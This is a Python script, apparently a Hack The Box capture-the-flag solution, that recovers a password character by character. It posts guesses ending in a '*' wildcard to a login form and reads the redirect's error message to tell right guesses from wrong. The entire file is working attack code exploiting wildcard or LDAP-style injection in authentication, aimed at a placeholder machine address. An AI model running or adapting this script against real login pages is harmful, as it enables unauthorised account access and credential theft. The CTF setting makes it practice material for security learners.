import requests
import string

try:
    # Python 3
    from urllib.parse import urlparse, parse_qs
except ImportError:
    # Python 2
    from urlparse import urlparse, parse_qs
#template HTB{s0me_t3xt}
lowercase = list(string.ascii_lowercase)
uppercase = list(string.ascii_uppercase)
digits  = list(string.digits)
other = ["#","$","%","@","!","{","}","[","]","_","&","^"," "]
attempts = lowercase+uppercase+digits+other
username = '' # I will not give username ;-)
host = 'http://machine_ip:port/login' 
def bruteforce(found_letter=None):
    for i in attempts:
        if found_letter != None:
            attempted_letter = found_letter+i
        else:
            attempted_letter = i
        cred = {'username':username, 'password':attempted_letter+'*'}
        r = requests.post(host, data=cred)
        o = urlparse(r.url)
        query = parse_qs(o.query)
        if 'message' in query:
            print(query['message'][0],' - Last attempted pattern:',attempted_letter)
        else:
            found_letter = i
            bruteforce(attempted_letter)
            break
bruteforce()







